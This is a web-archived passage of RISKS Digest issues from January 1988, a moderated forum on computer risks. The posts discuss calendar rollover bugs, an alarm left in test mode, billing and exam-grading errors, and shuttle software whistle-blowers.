fewer (or lots of blacked-out squares) and Arabic ones need more to
make the clues necessary for filling in the blanks.  Of course, one
could argue that the point is to fill them in correctly, but English
penalizes wrong words while a 2-d crossword puzzle in Arabic won't.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
RE: RISKS in Cable TV?
</A>
</H3>
<address>
Andy Goldstein
&lt;<A HREF="mailto:goldstein%star.DEC@src.dec.com ">
goldstein%star.DEC@src.dec.com 
</A>&gt;
</address>
<i>
Wed, 27 Jan 88 07:39:58 PST
</i><PRE>

In reply to [...]'s story of the cable remote box going off...

Save your paranoia for the folks that are really out to get you.  The
fluorescent lamp is the giveaway. A power interruption of a fraction of a
second will shut off a manual-start fluorescent lamp.  There's nothing the
cable control signals can do that would affect power delivery to the lamp.
Look for a loose fuse, a flaky circuit breaker, or flaky wiring. Soon,
before it starts a fire.

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Re: Calendar bomb in the Ada language
</A>
</H3>
<address>
Jim Purtilo 
&lt;<A HREF="mailto:purtilo@brillig.umd.edu">
purtilo@brillig.umd.edu
</A>&gt;
</address>
<i>
Tue, 26 Jan 88 22:25:14 EST
</i><PRE>

Douglas Jones (<A HREF="/Risks/6.15.html">RISKS-6.15</A>) doesn't need to wait until 2100 for more time
surprises.  If he can be patient until fourteen minutes and eight seconds
after 10pm on January 18, 2038, then those of us still running Unix 4.nBSD
on our 32-bit dinosaurs will find our ``gettimeofday'' system call returning
integers that roll over into a very negative number (remember the Unix
convention, time is based on `number of seconds since January 1, 1970').
Other system calls that (correctly or otherwise) take this value as a signed
integer will then tell us we have gone back to the simpler days of the early
20th century (my ctime call tells me this flashback will be to December 13,
1901, at 15:45:52.)

As an aside, it is interesting that, due to apparent errors in how the ctime
call operates on the integer argument in the conversion, I have found at
least one Unix implementation we regularly know and love which predicts this
hackers' millenia will occur 0x45FF seconds later than the correct moment.

Either way, I'm looking forward to it.                                Jim

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
Time Bombs in Bank Computers (Re: <A HREF="/Risks/6.11.html">RISKS-6.11</A>)
</A>
</H3>
<address>
John McLeod
&lt;<A HREF="mailto:jm7@pyr.gatech.edu ">
jm7@pyr.gatech.edu 
</A>&gt;
</address>
<i>
Wed, 27 Jan 88 11:56:13 EST
</i><PRE>

I was told by a professor recently that Nobody should have any money in a 
bank between december 31 1999 and jan 1 2001.  As there are so many 
cobol programs in existence with a two character year field.

JOHN MCLEOD, Georgia Insitute of Technology, Atlanta Georgia, 30332
uucp: ...!{akgua,allegra,amd,hplabs,ihnp4,seismo,ut-ngp}!gatech!gitpyr!jm7
ARPA: jm7@pyr.ocs.gatech.edu

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.15.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.17.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-53</DOCNO>
<DOCOLDNO>IA012-000130-B024-37</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.17.html 128.240.150.127 19970217015353 text/html 13370
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:52:22 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 17</TITLE>
<LINK REL="Prev" HREF="/Risks/6.16.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.18.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.16.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.18.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 17</H1>
<H2> Thursday, 28 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Two recent stories with lessons to be learned 
</A>
<DD>
<A HREF="#subj1.1">
Rich Kulawiec
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Ada Standard Time 
</A>
<DD>
<A HREF="#subj2.1">
Mike Linnig
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Preventing Train Collisions by Technology 
</A>
<DD>
<A HREF="#subj3.1">
Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Tax form iteration 
</A>
<DD>
<A HREF="#subj4.1">
G. Ansok
</A><br>
<A HREF="#subj4.2">
 Kenneth Sloan
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Boisjoly receives award 
</A>
<DD>
<A HREF="#subj5.1">
Peter Ladkin
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Two recent stories with lessons to be learned
</A>
</H3>
<address>
wombat
&lt;<A HREF="mailto:rsk@s.cc.purdue.edu ">
rsk@s.cc.purdue.edu 
</A>&gt;
</address>
<i>
Thu, 28 Jan 88 18:49:10 EST
</i><PRE>

First story: a friend of mine works in a chain drugstore in Indianapolis.
They have an alarm system which is connected to a computer at a security
company's central offices.  Periodically, the store manager conducts a
test by calling the security company, giving a password of some sort that
authenticates him as someone empowered to do this test, and then deliberately
setting off the alarms in the store one by one.  He then calls them back,
and finds out if all this worked.  On their end, they instruct their computer
that this particular system should be put in "test" mode for the duration
of the test, and then they put it back in "armed" mode.

On January 7th, the store conducted a test.  On January 23, the store was
burglarized and the police weren't called.  You guessed it: the system was
still in test mode, and thus the alarms were ignored even though the sensors
worked correctly.  It is unclear whether the store manager didn't call back
or whether the computer operator failed to reset the status on their alarms;
but what appalled me was that their software didn't flag this system as
having been in test mode for over two weeks.

                                [The burglar could plead No Con Test?  PGN]


Second story: our local cable company recently revamped their system, forcing
everyone to get new converters.  These new boxes have some additional features,
one of which is that they can be programmed to turn on at a preset time on a
preset channel.  (This makes videotaping a bit easier; it's now possible to
tape two programs on different encrypted channels in one session by instructing
the converter to switch channels.  Previously, one would have to set the
converter to one channel, program the VCR to tape that program, and then hope
somebody at home would remember to switch channels on the converter in between
programs.)

Well, the central cable clock is broken at the moment, and so none of this is
working very well.  It turns out that the converters don't have a free-running
clock which is periodically sync'd to the central office master (which was how
I figured they had implemented this function), but that the converter is told
to increment the clock every now and then (the person on the phone couldn't
tell me the interval) and thus it becomes helpless if the central clock fails.

Given the low cost of adding a local time-keeping function of the converter,
I'm surprised that this wasn't done.  The centralization of this function
may mean that it's more accurate--when it works; but it also means that
when it's broken, it's *really* broken.

                         [Moral: A glitch in time slaves lines.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Ada Standard Time (RE: <A HREF="/Risks/6.15.html">RISKS-6.15</A>)
</A>
</H3>
<address>
Mike Linnig 
&lt;<A HREF="mailto:LINNIG%eg.ti.com@RELAY.CS.NET">
LINNIG%eg.ti.com@RELAY.CS.NET
</A>&gt;
</address>
<i>
Thu, 28 Jan 88 16:50 CDT
</i><PRE>

Doug Jones is quite correct.  The current version of the Ada Standard
MIL-STD-1815A (1983) still has 2099 as the maximum year.  I assume they picked
such a limited range for error-checking reasons (i.e., having 88 as a year
would be an error if you meant 1988).  For the reasons Doug Jones stated I
would prefer to see the upper end of the range as 3099 or some such --  far
enough into the future that no device programmed in Ada need ever worry about
surviving that long.
                                Mike Linnig, Texas Instruments

      [Don't you think Fortran '77 will someday mean 2077?  or 3077?  
      It has already been around almost forever.  Why not forever?  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Preventing Train Collisions by Technology
</A>
</H3>
<address>
Mark Brader
&lt;<A HREF="mailto:msb@sq.com ">
msb@sq.com 
</A>&gt;
</address>
<i>
Thu, 28 Jan 88 01:00:30 EST
</i><PRE>

&gt; The FCC's private radio bureau reported [of the Chase, MD, accident]
&gt; that "This terrible collision could have been avoided had the
&gt; locomotives been under the control of a central computer."

It could also have been avoided if the turnout in question had had
a "derail".  This device, as the name suggests, would derail one train --
in this case, the locomotives -- rather than letting it onto the through
line where it could (and did) collide with, in this case, the passenger
train.  Derails are commonly seen on this continent, but generally only
at sidings where both switch and derail are manually controlled.

On the other hand, there was a famous accident in Britain in 1940
where a similar device called "trap points", operated in conjunction
with the turnout, did prevent the otherwise certain collision of
two passenger trains by allowing one to derail.

(The flip side of this method, of course, is that the derail, even if
properly used, could cause a derailment when there was no train nearby
on the main line and no chance of a collision.)

Mark Brader

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Tax form iteration
</A>
</H3>
<address>
"G ANSOK" 
&lt;<A HREF="mailto:ansok@scivax.stsci.edu">
ansok@scivax.stsci.edu
</A>&gt;
</address>
<i>
28 Jan 88 16:38:00 EST
</i><PRE>

Actually, this has been thought of before.  The preferred procedure,
according to the Fed's 1040 instructions, is to deduct the state taxes
withheld during 1987 on your 1987 federal return.  If you get a refund, that
must be declared as income on your 1988 federal return :-).  However, if you
need to send more money to the state, this isn't deducted until your 1988
return, either :-(.  Both this method and the figure-the- actual-state-tax
method are allowed.

I believe that some states have been pegging state taxes to the federal return
for years.  If so, no doubt you will hear from RISKS readers in those states.
This is not a new problem -- just new in California.
                                                  	    Gary Ansok

</PRE>
<HR><H3><A NAME="subj4.2">
Re: A feedback loop in tax preparation algorithms
</A>
</H3>
<address>
Kenneth Sloan 
&lt;<A HREF="mailto:sloan@tanga.cs.washington.edu">
sloan@tanga.cs.washington.edu
</A>&gt;
</address>
<i>
28 Jan 1988 12:39-PST
</i><PRE>

Well...without looking at the specifics, and relying only on general
principles of similar "loops", here's what I've always understood to be the
case.  Source: IRS instructions which dealt explicitly with the "problem".

You prepare the Federal return first.  On the Federal form, you show
the state taxes actually paid during the previous year.  The fact that
you may have to pay MORE state tax, or get a state REFUND, is
irrelevant.  The extra payment, or the refund, will affect NEXT year's
Federal tax.  Note that this principle holds even if there is no "loop"
(that is, you live in a state which does not peg it's taxes to Federal
tax policy).  In general, the Federal form is only interested in money
which actually flowed into and out of your pockets LAST YEAR.

The state return wants line items transferred from the Federal form
because they want to follow the same rules, but don't want to deal with
yet another copy of the forms.

So, "PGN's solution" is correct as far as it goes, but for other reasons.
Note that NEXT year, the Feds will want to know about the state tax refund
that you are getting THIS year (it's INCOME this year) or the extra tax you
actually paid THIS year (it's a state tax, paid NOW).

Of course, all of this is wrong if indeed there are explicit instructions
telling you to make "many successive iterations through the state and
federal computations if you want to be precise".  If you can cite them,
don't both to tell me about them, fire your state legislators.

But, I don't think that's so.  My guess is that the flaw is the idea that
"you cannot complete your federal return until you have completed your state
return".  I think that's simply wrong.

It's true that you can get a larger Federal deduction by overpaying you
state tax.  BUT, you get a larger income next year.  Somehow, this doesn't
look like a money making proposition.  It seems MUCH more likely that you
can make money by UNDERpaying (to the amount allowed) this year, taking a
hit on the deduction this year, getting the smaller income next year (you
get to deduct the final state tax payment), and having the money to use for
a year.
                                  -Ken Sloan

     [Of course there are no explicit instructions to go around the loop
     until you converge.  I think the author was musing on the difficulty 
     of calculating the exact tax due without over- or underpaying either 
     state or federal.  But the article seems to imply something more
     insidious than actually exists in practice.  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Boisjoly receives award
</A>
</H3>
<address>
Peter Ladkin
&lt;<A HREF="mailto:ladkin@kestrel.ARPA ">
ladkin@kestrel.ARPA 
</A>&gt;
</address>
<i>
Thu, 28 Jan 88 14:30:07 PDT
</i><PRE>

The New York Times for Thursday, Jan 28 has an article on page 9 entitled
`Whistle Blower To Get Award', mentioning that Roger Boisjoly, the former
Morton Thiokol engineer about whom there has been some recent risks discussion,
is to be awarded the Scientific Freedom and Responsibility Award by the
American Association for the Advancement of Science. The article also notes
that Boisjoly hopes his suit against Morton Thiokol results in `a drastic
improvement in ethical conduct'.
                                               peter ladkin

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.16.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.18.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-54</DOCNO>
<DOCOLDNO>IA012-000130-B024-60</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.18.html 128.240.150.127 19970217015407 text/html 21589
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:52:33 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 18</TITLE>
<LINK REL="Prev" HREF="/Risks/6.17.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.19.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.17.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.19.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 18</H1>
<H2> Friday, 29 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Amazing story about shuttle software whistle-blowers 
</A>
<DD>
<A HREF="#subj1.1">
Nancy Leveson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  AT&amp;T computer billing error 
</A>
<DD>
<A HREF="#subj2.1">
Dave Curry
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  A testing time for students 
</A>
<DD>
<A HREF="#subj3.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: RISKS in Cable TV? 
</A>
<DD>
<A HREF="#subj4.1">
Marty Moore
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Calendar bomb in the Ada language 
</A>
<DD>
<A HREF="#subj5.1">
Robert I. Eachus
</A><br>
<A HREF="#subj5.2">
 Marty Moore
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Technology Transfer Policy 
</A>
<DD>
<A HREF="#subj6.1">
Gordon S. Little
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  The fine points of fixed points 
</A>
<DD>
<A HREF="#subj7.1">
Jim Horning
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Horrendous proliferation of BITNET barfmail 
</A>
<DD>
<A HREF="#subj8.1">
BITNETters PLEASE READ
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Amazing story about shuttle software whistle-blowers
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Fri, 29 Jan 88 10:46:08 -0800
From: Nancy Leveson &lt;nancy@commerce.UCI.EDU&gt;

Time Magazine reports this week (1 Feb 1988, pp. 20-21) on a newly released
congressional study of safety problems with the Shuttle software and
hardware.  I recommend you all try to get the article.  It is horrifying.

Just in case you can not get it, I will try to summarize it.  Apparently, a
newly released report by a blue-ribbon committee of eight experts
commissioned to review NASA's safety procedures was highly critical about
NASA and its contractors.  Basically they charge that schedules are again
taking precedence over safety (as before the Challenger accident).  The
report also charges that NASA contractors have ignored and harassed
whistle-blowers.  Some were even threatened.

Some examples:

  Sylvia Robins was a system's engineer for Unisys who is one of the
contractors for shuttle software.  In March 1986 she was approached by
software experts at Rockwell (the prime contractor) for help to find out
whether Unisys had an adequatre system for testing the shuttle's backup
software.  She claims that she discovered that in order to save time, Unisys
was testing the main and backup software at the same time that changes were
being made in payload and other shuttle flight plans.  This saved a 3-week
hold for each test (until the changes were completed), but meant that the
test results were meaningless -- since the software could not be adjusted
and tested simultaneously.

When she told her supervisors about it, she was told to drop the matter and
not tell Rockwell about it.  She says her bosses considered her a
trouble-maker because she had earlier complained that Unisys did not have
the proper facilities for protecting the software for secret DoD missions
assigned to shuttle flights.  She claims that her supervisor met with some
employees and tried to get them to falsify some documents in order to
provide "proof" that she had called some staff meetings without authorizing
overtime pay.  When one woman refused to make such a false claim, she was
fired.  Robins was also fired.  She was then hired by a Rockwell subsidiary
where she repeated her complaints to her new bosses, to the FBI, and to
NASA's inspector general.  She has received letters threatening her life.
Two other whistle blowers also contend that they have received anonymous
telephone threats against their children.

Another case involves a former Rockwell QA engineer who says that an audit
against Rockwell's shuttle hardware and software revealed that only 12% met
NASA's contract specifications.  His supervisor told him to change the number 
in his report to 96% or better.  He refused and five weeks later was fired.

A current Rockwell engineer reports that the company in June 1987 failed to
place a protective password on at least one shipment of shuttle software
tapes, allowing changes to be made without being recorded.  She produced a
record showing that one anonymous change had actually been made to the
software.  The whistle-blowers also claim that supposed confidentiality of
complaints is not being observed at Rockwell and that, in fact, they have
found themselves being followed by cars at night, some of whose license
plates have been traced to the Rockwell security force.

Rockwell denies all charges.  George Rodney, who was given responsibility for
safety at NASA after the Rogers' Commission report on the Challenger accident,
says that they are reorganizing safety and quality control.  I can give
personal testimony that I have been contacted by people involved in the new
Safety Office at NASA Headquarters and that they appear to be sincerely
interested in doing something about software safety for NASA programs.  I am
not so convinced that their contractors are as committed, at least from the
evidence given in the Time story.

I gave a talk in October at the CPSR Annual Meeting and suggested that we
could not call ourselves professionals until we accept responsibility for the
quality of the products we produce.  It looks like some computer professionals
are doing that, at great personal cost.  I have fears, however, that this is
all just the tip of the iceberg.  Frankly, I can see little justification for
worrying about software that won't work in the year 2099 because of some flaw
in the way Ada handles dates.  We should be spending our time discussing what
to do about the software that may not work now.
                                                       Nancy Leveson

            [TIME article by Ed Magnuson, reported by Jay Peterzell/Houston.]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
AT&amp;T computer billing error
</A>
</H3>
<address>
Dave Curry
&lt;<A HREF="mailto:davy@intrepid.ecn.purdue.edu ">
davy@intrepid.ecn.purdue.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: Fri, 29 Jan 88 11:09:43 EST

From the Lafayette (Indiana) Journal &amp; Courier, 1-29-88:

NEW AT&amp;T COMPUTER BILLS CUSTOMERS TWICE

  PROVIDENCE, R.I. - Up to 2 million AT&amp;T telephone customers across the
country have been billed for payments they already made.  Some accounts have
mistakenly been referred to collection agencies.
  AT&amp;T officials said Wednesday that the billing problem stemmed from a new
computer system.
  Company officials said payments for the residence and small business accounts
were received but not properly posted in the billing records.
  Those with billing complaints were asked to send copies of their canceled
checks.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
A testing time for students
</A>
</H3>
<address>
Dave Horsfall
&lt;<A HREF="mailto:munnari!stcns3.stc.oz.au!dave@uunet.UU.NET ">
munnari!stcns3.stc.oz.au!dave@uunet.UU.NET 
</A>&gt;
</address>
<i>
Thu, 28 Jan 88 10:53:16 est
</i><PRE>

  An article in "The Australian", Tuesday 19th January, 1988, is headlined "No
  one told system the school year had changed".  It goes on to say: "Education
  officials worked through the night to check 45,000 sets of exam results last
  week, after a computer error sent false results to more than 80 Victorian
  students.  More than 50 students who sat the Year 12 Victorian Certificate
  of Education (VCE) exam were wrongly told they had passed.  At least 30
  others were told they had failed when they had actually been successful.

  The Victorian Curriculum and Assessment Board, which administers the exam,
  said one of the causes for the error was the change from a three-term to a
  four-term school year, which the board's computer had not been ready for.

  ... The media liasion officer for the VACB, Ms Wendy Hunter, told [the paper]
  that the error only affected about 85 of those "borderline" cases whose
  results depended on compensation - though she said the board realised how
  important the results were to each person.

  The complex method of compensation includes credit for work done during the
  term (no-one told the computer the shortened term counted for less) as well
  as the chance for good passes in some subjects to make up for a narrow fail
  in others.

  Ms Hunter explained that in a three-term year, credit was given for units per
  term, but in a four-term year it was for units per semester - which meant a
  term's work only counted for half a unit."

The best bit came at the end of the story:

  "The head of Melbourne's Swinbourne Institute of Technology computer centre
  queried the board's original statement that the problem had been caused by
  'computer error'.  ''Computer error can mean just about anything'', the
  centre's manager, Mr Michael Plunkett, said."

Indeed it can.

Dave Horsfall (VK2KFU)      ACS:  dave@stcns3.stc.OZ.AU
STC Pty Ltd                 ARPA: dave%stcns3.stc.OZ.AU@uunet.UU.NET
11th Floor, 5 Blue St       UUCP: {enea,hplabs,mcvax,uunet,ukc}!\
North Sydney NSW 2060 AUSTRALIA    munnari!stcns3.stc.OZ.AU!dave

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: RISKS in Cable TV?
</A>
</H3>
<address>
marty moore 
&lt;<A HREF="mailto:MOOREMJ@aim.rutgers.edu">
MOOREMJ@aim.rutgers.edu
</A>&gt;
</address>
<i>
Fri, 29 Jan 88 08:58 EST
</i><PRE>

It really is possible for the contents of a TV signal to affect the TV itself.
I once had a TV with one of the old sonic remote controls.  At that time there
was a cereal commercial (I don't recall which brand) which featured exploding
cereal boxes.  The explosion sound apparently contained the right frequency or
harmonic, because every time the explosion occurred, my TV changed channels.

I always thought this had great possibilities for unscrupulous TV station
programmers.  ("Let's buy some commercials through a dummy on the other 
stations...we'll bury the signal to change to our stations in the commercials.
The audience will never know the difference.")

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Calendar bomb in the Ada language
</A>
</H3>
<address>
Eachus
&lt;<A HREF="mailto:eachus@mitre-bedford.ARPA ">
eachus@mitre-bedford.ARPA 
</A>&gt;
</address>
<i>
Fri, 29 Jan 88 16:29:36 EST
</i><PRE>

	I hope to be around to celebrate the Ada Doom Date (January 1,
2100), but the situation is not as bad as has been indicated here.  In fact,
I would argue given recent experiences that the situation in Ada is much
better than the current state of the practice. The function TIME_OF will
raise CONSTRAINT_ERROR if called with a year outside the range 1901..2099,
and the "+" and "-" functions are required to raise TIME_ERROR if the
resulting TIME is outside the permitted range, but:

        None of  this  is  a  part of the   Ada language,  but a
        package  required    to  be    provided by  all    valid
        implementations.   In other words,  you can write or use
        your own.

	The  function CLOCK may return a time outside this range
	(assuming  the program  remains around  long  enough for
        that to be valid).

        All    Ada  implementations are  tested   as part of the
        validation   process to  see  that the  CALENDAR package
        functions correctly, and the  quality of these  tests is
        continually  being improved. There  shouldn't be any Ada
        time bombs for at least a hundred years, if then.

     Another doom date worth noting is January 1, 2028, the date when MS-DOS
goes belly up.  (Dates are represented internally in a 16-bit word, with
five bits for the day, four bits for the month and, you guessed it, a 7 bit
year).  Try putting in the wrong date on a machine with no clock and no hard
disk (and a spare copy of your system disk) sometime...
                        				    Robert I. Eachus

</PRE>
<HR><H3><A NAME="subj5.2">
Re: Calendar bomb in the Ada language
</A>
</H3>
<address>
marty moore 
&lt;<A HREF="mailto:MOOREMJ@aim.rutgers.edu">
MOOREMJ@aim.rutgers.edu
</A>&gt;
</address>
<i>
Fri, 29 Jan 88 08:57 EST
</i><PRE>

I have always assumed that the Ada type YEAR was constrained to the range
1901..2099 in order to simplify leap year calculations.  All years in that
range which are divisible by 4 are leap years; however, 1900 and 2100 are
not leap years.  Does anyone know if this is true? 

I wonder how many systems will have problems in 2100 because they
incorrectly assume it is a leap year.

                [OK.  Probably enough speculation on this topic for a 
                few years.  But let's hear it when the alarm goes off.  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 Technology Transfer Policy
</A>
</H3>
<address>
"Gordon S. Little" 
&lt;<A HREF="mailto:Littleg@HIS-PHOENIX-MULTICS.ARPA">
Littleg@HIS-PHOENIX-MULTICS.ARPA
</A>&gt;
</address>
<i>
Thu, 28 Jan 88 18:09 MST
</i><PRE>

Paul Smee's statement about the application of US technology transfer
policy is nothing short of astounding.

    &gt; Perhaps one of the lesser-known 'features' of the US technology
    &gt; transfer policy is the fact that the US government applies it
    &gt; internationally...

Political pressure we have with us always, and that is understandable
and a fact of life.  But what legal principle sanctions the right of
ANY country to enact laws governing the action of FOREIGN nationals
IN THEIR OWN (SOVEREIGN) COUNTRY?  This is hardly a technical RISK,
but if such unbelievable arrogance were to pass unchallenged and such
a principle were accepted internationally, the absurdities that could
result must be obvious to anyone.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
The fine points of fixed points 
</A>
</H3>
<address>
Jim Horning
&lt;<A HREF="mailto:horning@src.dec.com ">
horning@src.dec.com 
</A>&gt;
</address>
<i>
29 Jan 1988 1123-PST (Friday)
</i><PRE>

The year I moved back to Palo Alto from Canada I DID have an explicit
recursion in my tax calculation.  I had four kinds of income:

  1. Canadian income earned while a resident of Canada,
  2. American income earned while a resident of Canada,
  3. American income earned while a resident of America, and
  4. Canadian income earned while a resident of America.

The US claimed the right to tax all four kinds of income, but granted credits
